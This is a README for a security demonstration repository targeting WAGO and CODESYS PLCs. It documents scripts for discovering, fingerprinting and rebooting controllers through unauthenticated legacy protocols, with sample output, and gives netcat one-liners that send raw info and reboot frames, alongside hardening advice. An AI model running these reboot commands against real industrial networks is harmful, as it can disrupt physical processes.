## Description
Tis repo is a collection of tools to highlight the weaknesses of legacy protocol, and to show the importance of a cybersec configuration. 

## scan_codesys.py

This Python script benefits of discovery protocol used by CODESYS 3 (on port 1740) to gather information about PLCs on a network. 
A predefined UDP frame is sent to a broadcast address on port 1740, and answers from PLCs are collected and parsed.
This is a reminder that this port isn't secure, should be disabled. The discover feature is useful but isn't mandatory in order to use CODESYS.

### Usage

`python3 scan_codesys.py 192.168.1.255`

Example of result :
`IP Address      Device Name          Complete Name                            Manufacturer              MAC Address
192.168.1.12   PFC300-68415F        WAGO 750-8302 PFC300 2ETH RS             WAGO                      0030DE684161
192.168.1.4    PFC200V3-48117C      WAGO 750-8210 PFC200 G2 4ETH             WAGO                      0030DE48117C
192.168.1.5    0030DE5A9782         750-8001 Basic Controller 100 2ETH       WAGO GmbH & Co. KG        37SUN31564010260523873+0000000000000176
`

## wagoservice.py

This Python script uses legacy protocol WAGO Service on port 6626, used by software like WAGO Ethernet Settings or WAGO I/O Check. 
This legacy protocol is unauthenticated. 
WAGO Ethernet Settings can be easily replaced by the Web Based Management, which is secure. 
WAGO I/O Check is used for configuration of I/O modules, but should be used only during the commissionning, ideally when the PLC isn't connected to the network. 
The script sends predefined TCP frame in order to gather information about WAGO PLCs and could be used to reboot the PLC. 
A discover function based on NMAP will WAGO devices with 6626 port open on the specified network.
When a network adress is provided, the reboot function will restart all WAGO devices... Be careful.

### Usage

`python3 wagoservice.py  <command> <address/network>`

where :
- command : info / reboot / discover
- address/network : can be a single IP address or a network in CIDN format (i.e 192.168.1.0/24)

Example and results :

python3 wagoservice.py discover 192.68.1.0/24
+---------------------+---------------------+---------------------+---------------------+---------------------+
| IP Address          | MAC Address         | PSN                 | SW-VER              | SN                  |
+---------------------+---------------------+---------------------+---------------------+---------------------+
| 192.168.1.1         | 00:30:DE:0A:93:56   | 750-880             | 01.08.25(16)        | SN20121115T113608-0416146#PFC|0030DE069605 |
| 192.168.1.2         | 00:30:DE:06:96:05   | 750-8001            | 01.04.02(00)        | SN20230403T202128-1738604#BC|0030DE5A9782 |
| 192.168.1.3         | 00:30:DE:5A:97:82   | 751-9301            | 04.06.03(28)        | 37SUN31564010260470190+0000000002347218 |
| 192.168.1.4         | 00:30:DE:4E:6F:EC   | 750-8302            | 04.06.01(28)        | 37SUN31564010260575922+0000000000001690 |
| 192.168.1.5         | 00:30:DE:68:41:5F   | 750-8210            | 04.05.10(27)        | 37SUN31564010260429954+0000000000000008 |
| 192.168.1.6         | 00:30:DE:48:11:7C   | 750-8217            | 03.10.10(22)        | 37SUN31564010260430577+0000000000003662 |
+---------------------+---------------------+---------------------+---------------------+---------------------+


## One-liner commands

Also based on WAGO Service protocol, this simple commands can be used to retrieve information or to reboot a WAGO PLC device.
Can be used directly on a WAGO Linux-based PLC.

### Get information
`echo '8812020001000100000000000000000002000801' | xxd -r -p | nc 192.168.1.10 6626`

### Reboot
`echo '8812320001000100000000000000000002000201' | xxd -r -p | nc 192.168.1.10 6626`

# Disclaimer  
This collection of tools is intended solely for legitimate and authorized use in conducting cybersecurity demonstration within a network. Users are required to obtain proper authorization from network owners or administrators before use.

The developer of this program assumes no responsibility for any unauthorized use or any consequences arising from the improper application of this tool. By using this tool, you agree that you have the necessary permissions and you assume all liability associated with its use. Please ensure compliance with all applicable laws and regulations regarding network scanning and cybersecurity practices.